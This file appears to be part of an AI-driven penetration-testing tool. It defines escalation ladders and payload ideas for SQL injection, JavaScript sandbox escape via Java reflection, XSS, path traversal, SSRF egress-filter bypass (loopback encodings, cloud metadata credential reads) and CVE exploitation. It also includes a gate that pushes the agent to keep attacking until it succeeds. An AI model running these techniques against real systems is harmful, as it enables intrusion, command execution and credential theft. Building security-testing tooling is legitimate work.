"""Persistent exploitation deepening (design + proof: design/DEEP_EXPLOITATION.md).

A satisficing agent stops at its first plausible conclusion: "I sent one SQL quote, got a 200,
concluded not-injectable" or "one GraalJS reflection payload was blocked, concluded sandboxed".
That is exactly how a flagged SQLi / `ScriptEngine.eval` sink is reported-but-never-broken.

This module turns exploitation of a high-value sink into a LADDER WALK with three guarantees
(proven in the design doc):

  1. NO-PREMATURE-GIVE-UP. The loop may conclude "not exploitable" ONLY when either a confirmation
     oracle fired (OOB callback / exec/error signal) OR every technique family in the sink's ladder
     has a recorded attempt (exhaustion). One blocked payload can never end the hunt.
  2. SELF-LEARNING. Every failed attempt yields a structured LESSON (what blocked it: WAF, type
     coercion, sandbox policy, missing interop ...). The next attempt's prompt carries the
     accumulated lessons + the remaining untried families, so the agent escalates intelligently
     instead of repeating the payload that already failed.
  3. TERMINATION. Each ladder is finite; each family is bounded to MAX_VARIANTS attempts. The walk
     visits at most |ladder| * MAX_VARIANTS states and the under-tried set strictly shrinks.

Pure logic + injectable inputs so it is unit-testable; the worker tasks (deepen_init /
deepen_observe / deepen_gate) are thin wrappers in workers/recon/tasks.py.
"""

from __future__ import annotations

import re

from common import features, tradecraft

# Each family is attempted up to MAX_VARIANTS times (escalated variants, each informed by the prior
# attempt's lesson) before it counts as "covered". Exhaustion is DEPTH-based: the give-up gate keeps
# the agent trying — a new family or a new variant — until every family has had MAX_VARIANTS attempts
# (or the per-sink step budget runs out, or an oracle confirms). With a ~30-step budget and the
# 6-family injection ladder this means roughly "keep trying ~30 escalating attempts before giving up".
MAX_VARIANTS = 5

# Ordered technique ladders, cheapest/most-diagnostic first -> highest-impact last. The agent walks
# the ladder; `idea` seeds the prompt for that rung (the agent crafts the concrete payload). These
# are the in-code DEFAULTS; `catalog/tradecraft.yaml` may overlay/extend them (HC tunable surface).
_LADDERS_DEFAULT: dict[str, list[dict]] = {
    "sqli": [
        {"family": "error-based", "idea": "Break the query with a quote/type mismatch and read the DB error reflected in the response (or a 500 with a SQL fragment)."},
        {"family": "boolean-blind", "idea": "Inject AND 1=1 vs AND 1=2 and diff a stable response field (length/row/flag) to prove the predicate is evaluated."},
        {"family": "time-blind", "idea": "Conditional SLEEP/pg_sleep/WAITFOR/dbms_pipe; measure the latency delta vs a control to prove blind execution."},
        {"family": "union-based", "idea": "Once column count/types are known, UNION SELECT to read version()/current_user/a sibling table."},
        {"family": "stacked", "idea": "Stacked queries (semicolon) for a write/DDL where the driver allows it (MSSQL/Postgres multi-statement)."},
        {"family": "oob-exfil", "idea": "Out-of-band exfil (load_file/UTL_HTTP/xp_dirtree/DNS) to an sc.oob() canary -- decisive for fully-blind sinks."},
        {"family": "waf-bypass", "idea": "Encoding/case/inline-comment/whitespace/CHAR() variants to defeat input filtering, then re-run the strongest rung above."},
    ],
    "js-sandbox-escape": [
        {"family": "direct-eval", "idea": "Confirm the expression is evaluated with a DISTINCTIVE arithmetic oracle (1337*1337 -> 1787569, not 7*7=49 which occurs naturally) echoed back through the feature's output."},
        {"family": "global-recon", "idea": "Enumerate reachable bindings/globals from the script context (this, typeof Java, Polyglot, engine, load, quit) to map the escape surface."},
        {"family": "reflection-breakout", "idea": "Java reflection from JS: java.lang.Runtime.getRuntime().exec / java.lang.ProcessBuilder, or Java.type('java.lang.Runtime') on Nashorn/GraalJS host access."},
        {"family": "constructor-chain", "idea": "Gadget via ''.getClass().forName(...) / the Function constructor / prototype pollution to reach a host class the binding didn't expose directly."},
        {"family": "engine-api", "idea": "Abuse host objects exposed TO the engine (Polyglot Context, bindings, load()/loadWithNewGlobal, ScriptEngineManager) for interop the policy forgot to close."},
        {"family": "rce-confirm", "idea": "Execute a benign command whose side effect hits the sc.oob() canary (curl/nslookup/wget the canary URL) -- decisive proof of host RCE."},
        {"family": "fs-read", "idea": "Read a server file via host interop (java.nio.file.Files / FileReader on /proc/self/environ, app config, a secret) and surface a distinctive value."},
        {"family": "encoding-bypass", "idea": "Unicode/charCode/String.fromCharCode/eval-string construction to bypass keyword filtering, then re-run reflection-breakout."},
    ],
    "xss": [
        {"family": "reflect-probe", "idea": "Confirm the input reflects into the response and in WHICH context (HTML body / attribute / JS string / URL) -- send a unique marker and locate it unencoded."},
        {"family": "context-breakout", "idea": "Break out of the reflection context: close the tag/attribute/quote/script as needed so an injected element/handler actually parses (e.g. \"><svg/onload=...>, '-alert()-', </script><script>)."},
        {"family": "filter-bypass", "idea": "Defeat encoding/sanitisation: event-handler variants, case/whitespace, HTML-entity/unicode, svg/math, javascript: URIs, mutation-XSS."},
        {"family": "stored-xss", "idea": "Persist the payload as identity A (profile name/comment/label/template), then RETRIEVE the resource as a DIFFERENT identity/victim view -- a stored, cross-user hit is the high-severity prize."},
        {"family": "dom-sink", "idea": "If the value flows into a client-side sink (innerHTML, location, eval, template), craft a DOM-XSS that fires without a server round-trip."},
        {"family": "oob-exfil", "idea": "Make the executed script beacon to an sc.oob() canary (fetch/img) -- a callback from a victim/admin context is decisive proof the script ran out-of-band."},
    ],
    "traversal": [
        {"family": "dotdot", "idea": "Climb out of the intended directory with ../ sequences toward a known file (/etc/passwd, app config, the BPMN/import base dir)."},
        {"family": "encoding-bypass", "idea": "Encoded traversal to defeat filters: %2e%2e%2f, double-encode %252e, ..%2f, unicode, backslash, leading-slash stripping."},
        {"family": "absolute-path", "idea": "Supply an absolute path or a file:// URL where the field is treated as a path/URL."},
        {"family": "known-file", "idea": "Read a high-signal file and surface a distinctive line (root:x:0:0 from /etc/passwd, a secret from app config) as proof."},
        {"family": "null-suffix", "idea": "Null-byte / suffix tricks to bypass an appended extension (file%00.png, path?.json), then re-run known-file."},
        {"family": "oob-exfil", "idea": "If reads are blind, confirm via an OOB-fetch of the traversed path or a timing/error oracle."},
    ],
    # SSRF / internal-reach: an egress denylist that blocks the canonical internal/metadata targets
    # is NOT "not exploitable" — a single representation slipping past the filter (e.g. the IPv6
    # loopback [::1] when 127.0.0.1 is blocked) reaches the internal service. The walk is a
    # COMPLETE corpus of internal-target representations, not ad-hoc recall: the agent tries every
    # rung's representations against the same internal endpoint and watches for a non-403 reach.
    "ssrf": [
        {"family": "canonical-internal", "idea": "Point the outbound-fetch field (HTTP-task uri / webhook / import URL) at the canonical internal targets: http://127.0.0.1:8080/actuator/env, http://localhost:8080/actuator/health, http://169.254.169.254/latest/meta-data/. Establish the baseline: which return the cluster egress block (403 'blocked in this cluster') vs a backend response."},
        {"family": "loopback-forms", "idea": "When 127.0.0.1/localhost are blocked, walk EVERY loopback representation: [::1], [0:0:0:0:0:0:0:1], 0.0.0.0, the bare 0, 127.1, 127.0.0.1.nip.io, a trailing-dot 127.0.0.1. — and the same paths on an internal port (8080 actuator, 6379 redis, 9090 metrics)."},
        {"family": "numeric-encoding", "idea": "Numeric/encoded forms of the internal IP that string-match filters miss: decimal 2130706433 (127.0.0.1) / 2852039166 (169.254.169.254), hex 0x7f000001 / 0xA9FEA9FE, octal 0177.0.0.1, mixed, zero-padded. (Note: some resolvers reject octal/hex — record which the platform's HTTP client accepts.)"},
        {"family": "ipv6-bypass", "idea": "IPv6 literals the IPv4-oriented filter ignores: the loopback [::1] (the decisive one when v4 is blocked), IPv4-mapped [::ffff:127.0.0.1] / [::ffff:169.254.169.254] / [::ffff:a9fe:a9fe], and the AWS IPv6 IMDS [fd00:ec2::254]. This is the netty-handler IpSubnetFilterRule class of bypass."},
        {"family": "metadata-pivot", "idea": "Walk the full cloud-metadata corpus (substrates pack) with the REQUIRED header: AWS 169.254.169.254 + [fd00:ec2::254] (IMDSv2 PUT-token dance first), GCP metadata.google.internal (Metadata-Flavor: Google), Azure (Metadata: true), Alibaba 100.100.100.200 — read iam/security-credentials, instance-identity, the SA token."},
        {"family": "scheme-userinfo-redirect", "idea": "Defeat host-based filters by structure, not address: a userinfo prefix (http://allowed-host@[::1]:8080/), an open-redirector or attacker page that 30x-redirects to the internal target, and alternate schemes the fetcher honours (gopher:// for raw TCP to redis, dict://, file:// for local read)."},
        {"family": "internal-port-scan", "idea": "Once ANY internal reach lands, enumerate the internal topology: probe internal ports/paths (8080 /actuator/* /api-docs /api/admin, 6379 redis PING, 9090, k8s 6443/10250) and surface a distinctive internal-only body (org/tenant data, the internal OpenAPI spec, a config value) as the impact proof."},
        {"family": "oob-confirm", "idea": "For a blind fetch (no response body returned), plant an sc.oob() canary as the target and trigger the flow — an inbound hit proves reach. In-band, the decisive oracle is the DIFFERENTIAL: the same internal target returns the cluster-block 403 for blocked forms but a backend response (2xx internal content, or a backend-generated 401/INVALID_TOKEN that proves the request traversed) for the bypass form."},
    ],
    "injection": [
        {"family": "syntactic", "idea": "Canonical payload for the most likely engine (SpEL ${...}, OGNL, Velocity, shell `;id`, SSTI {{1337*1337}} -> distinctive product 1787569)."},
        {"family": "alternate-engine", "idea": "If the canonical engine is wrong, try the other plausible ones -- the same field may feed SpEL OR OGNL OR a JS evaluator."},
        {"family": "reflection-breakout", "idea": "Pivot the expression engine to the host runtime: T(java.lang.Runtime)/ProcessBuilder/Runtime.exec for command execution."},
        {"family": "encoding-bypass", "idea": "Encoding/escaping/concatenation variants to defeat filtering, then re-run the strongest rung."},
        {"family": "gadget-chain", "idea": "If a sink accepts serialized/structured input, a deserialization/gadget chain (ysoserial-style) toward exec."},
        {"family": "oob-exfil", "idea": "Blind confirmation via an sc.oob() canary the executed payload must fetch."},
    ],
    # CVE / supply-chain exploitation: generic escalation RUNGS, specialized per-CVE by the
    # exploit_hint (cve_tradecraft: class + technique + oracle) threaded into the hypothesis. The
    # hypothesis carries the concrete HOW; these rungs are the order to escalate it.
    "cve": [
        {"family": "published-poc", "idea": "Map the reachable feature/endpoint that exercises the vulnerable dependency, then issue the published PoC payload from the advisory (use the hypothesis exploit_hint TECHNIQUE verbatim) as a low-priv identity."},
        {"family": "payload-variant", "idea": "Adapt the payload to THIS deployment: encoding, sizing, header/content-type, the exact task field (HTTP uri/body, INLINE expr, EVENT sink, import/upload) that reaches the lib."},
        {"family": "alternate-vector", "idea": "Deliver the same CVE through a different reachable feature that exercises the dependency (a second task type / endpoint) if the first is filtered."},
        {"family": "chain-precondition", "idea": "Combine with a confirmed primitive to reach the vulnerable path (e.g. use a confirmed SSRF to deliver the smuggling/parser payload to an internal listener)."},
        {"family": "oob-confirm", "idea": "Fire the hypothesis exploit_hint ORACLE: an sc.oob() canary hit, a parser/exec error oracle, or a bounded timing/RSS knee vs baseline (resilience tier). Presence of the version alone is NOT confirmation."},
    ],
}

# The live ladders = defaults overlaid with catalog/tradecraft.yaml (HC-tunable, ratify-gated).
LADDERS: dict[str, list[dict]] = tradecraft.ladders(_LADDERS_DEFAULT)

# The internal-target / egress-bypass CORPUS the SSRF ladder must walk — data, not LLM recall. A
# single representation slipping past the egress denylist (e.g. the IPv6 loopback [::1] when the
# IPv4 forms of 127.0.0.1 are blocked) reaches the internal service, so the agent walks the WHOLE
# set every run (surfaced in focus_brief). HC-tunable via catalog/tradecraft.yaml `egress_bypass`.
INTERNAL_TARGET_CORPUS: tuple = tradecraft.signatures("egress_bypass", (
    "127.0.0.1", "localhost", "[::1]", "[0:0:0:0:0:0:0:1]", "0.0.0.0", "0", "127.1",
    "127.0.0.1.nip.io", "2130706433", "0x7f000001", "0177.0.0.1", "[::ffff:127.0.0.1]",
    "169.254.169.254", "[::ffff:169.254.169.254]", "[::ffff:a9fe:a9fe]", "[fd00:ec2::254]",
    "2852039166", "0xa9fea9fe", "metadata.google.internal", "100.100.100.200",
))

# Substrings that indicate a POSITIVE confirmation oracle fired. CRITICAL: these must be
# SERVER-EMITTED signals, never tokens that appear in the attacker's own payload (e.g. "union
# select", "sleep(", "<script>") — otherwise the agent's payload echoed back would falsely confirm.
_CONFIRM_HINTS = (
    # OOB collaborator callbacks (decisive for blind vectors)
    "oob hit", "oob_hit", "inbound hit", "canary hit", "callback received",
    # server-side command execution / file disclosure (UNIX + Windows server-file content)
    "uid=", "gid=", "root:x:0:0", "/proc/self/environ",
    "[boot loader]", "[fonts]", "for 16-bit app support",          # win.ini / system.ini content
    # SSTI: the DISTINCTIVE arithmetic product 1337*1337 (server-evaluated; never in the literal
    # payload, which carries the expression {{1337*1337}}, not the result). 7*7=49 is too common
    # to confirm on, so the ladder uses this distinctive product.
    "1787569",
    # database-engine ERROR strings (emitted by the server, not the payload)
    "you have an error in your sql", "sqlstate", "ora-00", "ora-01", "sqlite_error",
    "syntax error near", "syntax error at or near", "unterminated quoted string",
    "psqlexception", "sqlexception", "mysqlsyntaxerror", "queryfailederror",
)


def _norm(text) -> str:
    return str(text or "").lower()


def ladder_for(hypothesis: dict) -> tuple[str, list[dict]]:
    """Pick (sink_class, ladder) for a hypothesis from its category / objective / title / target.
    Falls back to the generic 'injection' ladder for any code/expression-execution hypothesis."""
    h = hypothesis if isinstance(hypothesis, dict) else {}
    blob = _norm(" ".join(str(h.get(k, "")) for k in ("title", "target", "category", "objective_id", "rationale")))
    # CVE / supply-chain hypotheses (carry a cve_id, or target INFRA-SUPPLY-CHAIN) walk the generic
    # CVE escalation ladder, specialized per-CVE by the exploit_hint. Checked first so a CVE whose
    # title mentions e.g. "sql" isn't mis-routed to the SQLi ladder.
    if h.get("cve_id") or "supply-chain" in blob or re.search(r"\bcve-\d", blob):
        return "cve", LADDERS["cve"]
    if "sql" in blob or re.search(r"\bsqli\b", blob):
        return "sqli", LADDERS["sqli"]
    if re.search(r"\bxss\b|cross[- ]site script|client-xss", blob):
        return "xss", LADDERS["xss"]
    if re.search(r"travers|\blfi\b|path-travers|directory travers|local file", blob):
        return "traversal", LADDERS["traversal"]
    # SSRF / internal-reach (incl. open-redirect, which CLASS_OBJECTIVE maps to INFRA-SSRF) walks the
    # dedicated egress-bypass ladder — NOT the code-injection ladder it used to fall through to.
    if (h.get("objective_id") == "INFRA-SSRF"
            or re.search(r"\bssrf\b|open[- ]redirect|server-side request|outbound fetch|egress|"
                         r"\bimds\b|instance metadata|internal reach|169\.254|metadata\.google", blob)):
        return "ssrf", LADDERS["ssrf"]
    if (re.search(r"\b(javascript|js|nashorn|graaljs|graal|scriptengine|ecmascript|jsr[\- ]?223)\b", blob)
            or re.search(r"\beval\b|eval\(", blob)
            or "inline task" in blob or "script engine" in blob):
        return "js-sandbox-escape", LADDERS["js-sandbox-escape"]
    return "injection", LADDERS["injection"]


def init_state(hypothesis: dict) -> dict:
    """Initial deepen state for a hypothesis: the chosen ladder + an empty ledger. Carries the
    hypothesis identifiers (objective_id / cve_id / dependency) so each recorded attempt is
    self-describing — `attempt_op` can emit a deterministic family/CVE-tagged operation for the
    coverage ledger without depending on the agent remembering to call sc.injection_attempt."""
    hypothesis = hypothesis if isinstance(hypothesis, dict) else {}
    sink_class, ladder = ladder_for(hypothesis)
    return {
        "sink_class": sink_class,
        "objective_id": str(hypothesis.get("objective_id") or ""),
        "cve_id": str(hypothesis.get("cve_id") or ""),
        "dependency": str(hypothesis.get("dependency") or ""),
        "ladder": [r["family"] for r in ladder],
        "ladder_detail": ladder,
        "ledger": {},          # family -> {tries, outcome, lesson}
        "lessons": [],         # ordered [{family, lesson}]
        "confirmed": False,
        "confirm_evidence": "",
    }


def attempt_op(state: dict, family: str, lesson: str = "", confirmed: bool = False) -> dict:
    """A deterministic operation-ledger record for ONE deepen attempt, so technique_coverage and the
    cve_attempt/injection_attempt completion gates see the family/CVE tags even when the agent's code
    didn't tag them. type is `cve_attempt` when the hypothesis carries a cve_id (so INFRA-SUPPLY-CHAIN
    completion fires), else `injection_attempt`. Controlled fields only (no raw target text beyond a
    bounded lesson note)."""
    state = state if isinstance(state, dict) else {}
    cve_id = str(state.get("cve_id") or "")
    fam = str(family or "")
    op = {
        "type": "cve_attempt" if cve_id else "injection_attempt",
        "family": fam,
        "sink_class": str(state.get("sink_class") or ""),
        "objective_id": str(state.get("objective_id") or ""),
        "status": "confirmed" if confirmed else "attempted",
        "note": str(lesson or "")[:200],
        "source": "deepen",
    }
    if cve_id:
        op["cve_id"] = cve_id
        op["dependency"] = str(state.get("dependency") or "")
    return op


def _tries(state: dict, family: str) -> int:
    return int(((state.get("ledger") or {}).get(family) or {}).get("tries") or 0)


def untried(state: dict) -> list[str]:
    """Families with zero recorded attempts (the front line of escalation)."""
    return [f for f in (state.get("ladder") or []) if _tries(state, f) == 0]


def under_tried(state: dict, max_variants: int = MAX_VARIANTS) -> list[str]:
    """Families that have not yet reached MAX_VARIANTS attempts."""
    return [f for f in (state.get("ladder") or []) if _tries(state, f) < max_variants]


def next_family(state: dict, max_variants: int = MAX_VARIANTS) -> dict | None:
    """The LEAST-tried family still under its variant budget (ladder order breaks ties). This gives
    breadth first (all families at 0 → ladder order) then even depth (everyone to 1, then 2, ...),
    so effort spreads across techniques rather than hammering one. None iff every family has reached
    MAX_VARIANTS -- the only non-confirmed, non-budget reason the walk may stop."""
    order = state.get("ladder") or []
    detail = {r["family"]: r for r in (state.get("ladder_detail") or [])}
    candidates = [(fam, _tries(state, fam)) for fam in order if _tries(state, fam) < max_variants]
    if not candidates:
        return None
    fam, tries = min(candidates, key=lambda c: c[1])   # least-tried; ties → earliest in ladder order
    return {**detail.get(fam, {"family": fam}), "tries": tries}


def detect_confirmation(result: dict, oob_hits: list | None = None,
                        sink_class: str = "") -> tuple[bool, str]:
    """Decide whether an attempt CONFIRMS exploitation from a code_exec result + OOB hits.
    Confirmation requires a positive oracle -- an OOB inbound hit or a decisive in-band signal --
    never merely a 200 or a reflected echo. For an SSRF sink, the in-band oracle is the internal-reach
    DIFFERENTIAL (features.internal_reach): an internal target reached past the egress denylist."""
    if oob_hits:
        return True, f"OOB inbound hit ({len(oob_hits)} canary callback(s)) -- server-side execution confirmed"
    res = result if isinstance(result, dict) else {}
    # explicit agent/sandbox finding
    for f in (res.get("result", {}) or {}).get("findings", []) or []:
        if isinstance(f, dict) and (f.get("confirmed") is True):
            return True, str(f.get("evidence") or f.get("title") or "sandbox-reported confirmation")
    blob = _norm((res.get("stdout") or "")) + " " + _norm(
        " ".join(str(e) for e in (res.get("result", {}) or {}).get("evidence", []) or []))
    # SSRF internal-reach oracle (gated on the ssrf sink so a backend 401/health body in an unrelated
    # auth test can't false-confirm): a non-403 backend response from an internal target = reach.
    if sink_class == "ssrf":
        reached, ev = features.internal_reach(blob)
        if reached:
            return True, ev
    hit = next((h for h in _CONFIRM_HINTS if h in blob), "")
    if hit:
        return True, f"in-band oracle matched ('{hit}')"
    return False, ""


def observe(state: dict, family: str, lesson: str, *, result: dict | None = None,
            oob_hits: list | None = None, max_variants: int = MAX_VARIANTS) -> dict:
    """Record ONE attempt against `family`: bump its try count, store the lesson, and set the
    confirmed flag if an oracle fired. Returns the updated state (pure: caller persists it)."""
    state = {**state}
    ledger = {**(state.get("ledger") or {})}
    fam = family if family in (state.get("ladder") or []) else None
    confirmed, ev = detect_confirmation(result or {}, oob_hits, sink_class=str(state.get("sink_class") or ""))
    if fam:
        slot = {**(ledger.get(fam) or {})}
        slot["tries"] = int(slot.get("tries") or 0) + 1
        slot["outcome"] = "confirmed" if confirmed else "blocked"
        if lesson:
            slot["lesson"] = str(lesson)[:400]
        ledger[fam] = slot
    state["ledger"] = ledger
    lessons = list(state.get("lessons") or [])
    if lesson and fam:
        lessons.append({"family": fam, "lesson": str(lesson)[:400]})
    state["lessons"] = lessons[-12:]
    if confirmed:
        state["confirmed"] = True
        state["confirm_evidence"] = ev
    return state


def exhausted(state: dict, max_variants: int = MAX_VARIANTS) -> bool:
    """True iff every ladder family has been tried MAX_VARIANTS times (DEPTH-exhausted) -- the agent
    has genuinely tried everything it knows for this sink. Until then the give-up gate keeps it
    trying a new family or a fresh variant (bounded only by the per-sink step budget)."""
    return len(under_tried(state, max_variants)) == 0


def gate_conclude(state: dict, proposed_confirmed: bool, max_variants: int = MAX_VARIANTS) -> dict:
    """THE no-premature-give-up guard (design-doc Theorem 2).

    Returns {allow, reason, directive}:
      * allow=True  iff the agent confirmed (proposed_confirmed or state.confirmed) OR the ladder is
                    exhausted. The conclusion is accepted and the loop ends.
      * allow=False iff the agent tries to conclude "not exploitable" while untried families remain.
                    The conclusion is REJECTED and `directive` tells the agent exactly what to try
                    next (untried families + lessons learned) -- i.e. try harder, differently."""
    confirmed = bool(proposed_confirmed) or bool(state.get("confirmed"))
    if confirmed:
        return {"allow": True, "reason": "confirmed", "directive": ""}
    if exhausted(state, max_variants):
        return {"allow": True, "reason": "ladder-exhausted",
                "directive": "", "verdict": "not-exploitable-after-exhaustive-escalation"}
    fresh = untried(state)
    remaining = under_tried(state, max_variants)
    families_line = (
        f"Untried technique families: {', '.join(fresh)}. " if fresh
        else f"Families with attempts left -- try a NEW variant/angle (not a repeat): {', '.join(remaining)}. "
    )
    return {
        "allow": False,
        "reason": "premature-giveup-blocked",
        "directive": (
            "DO NOT conclude yet. You have not exhausted the escalation ladder for this "
            f"{state.get('sink_class')} sink. " + families_line
            + _directive_for(state, fresh or remaining)
            + " " + lessons_digest(state)
            + " Craft and EXECUTE the next attempt now (tag your action with \"family\": \"<name>\")."
        ),
    }


def _directive_for(state: dict, remaining: list[str]) -> str:
    detail = {r["family"]: r.get("idea", "") for r in (state.get("ladder_detail") or [])}
    nxt = remaining[0] if remaining else ""
    idea = detail.get(nxt, "")
    return f"Next rung -> {nxt}: {idea}" if idea else ""


def lessons_digest(state: dict, limit: int = 6) -> str:
    """Compact 'what blocked each family so far' brief for the next prompt (self-learning input)."""
    ls = (state.get("lessons") or [])[-limit:]
    if not ls:
        return ""
    body = "; ".join(f"{x.get('family')}: {x.get('lesson')}" for x in ls if x.get("lesson"))
    return f"Lessons from prior attempts (do not repeat what already failed): {body}." if body else ""


def focus_brief(state: dict) -> str:
    """A status brief for the deepening prompt: the ladder, what's tried/untried, and lessons."""
    ladder = state.get("ladder") or []
    status = []
    for f in ladder:
        n = _tries(state, f)
        oc = ((state.get("ledger") or {}).get(f) or {}).get("outcome", "")
        status.append(f"{f}[{'untried' if n == 0 else (oc or f'{n}x')}]")
    head = f"Sink class: {state.get('sink_class')}. Escalation ladder status: " + ", ".join(status) + "."
    extra = ""
    if state.get("sink_class") == "ssrf":
        extra = (" Internal-target corpus to walk (try EACH representation against the same internal "
                 "endpoint; a single egress 403 'blocked in this cluster' is NOT a dead end — a "
                 "non-403 backend response from ANY form is a confirmed internal reach): "
                 + ", ".join(INTERNAL_TARGET_CORPUS) + ".")
    return (head + extra + " " + lessons_digest(state)).strip()
